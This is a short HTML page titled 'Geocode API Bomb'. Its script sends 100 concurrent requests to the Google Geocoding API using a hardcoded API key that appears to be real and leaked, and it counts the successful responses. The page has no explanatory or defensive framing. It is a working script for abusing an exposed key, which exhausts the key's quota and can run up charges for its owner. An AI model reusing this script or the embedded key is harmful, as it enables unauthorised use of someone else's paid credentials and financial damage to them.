<!DOCTYPE html>
<html>
<head>
  <title>Geocode API Bomb</title>
</head>
<body>
  <h2>Sending 100 Requests...</h2>
  <p id="success-count">Success: 0</p>

  <script>
    const apiUrl = "https://maps.googleapis.com/maps/api/geocode/json?address=New+York&key=AIzaSyDsBDwflgnw7DPOCi5DWiAezkAptmwPSLA";
    let successCount = 0;
    const totalRequests = 100;

    async function sendRequest(i) {
      try {
        const response = await fetch(apiUrl, {
          method: "GET",
          mode: "cors"
        });

        if (response.status === 200) {
          successCount++;
          document.getElementById("success-count").innerText = `Success: ${successCount}`;
        }

        const data = await response.json();
        console.log(`Request ${i + 1} - Status: ${response.status}`, data);
      } catch (err) {
        console.error(`Request ${i + 1} failed:`, err);
      }
    }

    for (let i = 0; i < totalRequests; i++) {
      sendRequest(i);
    }
  </script>
</body>
</html>
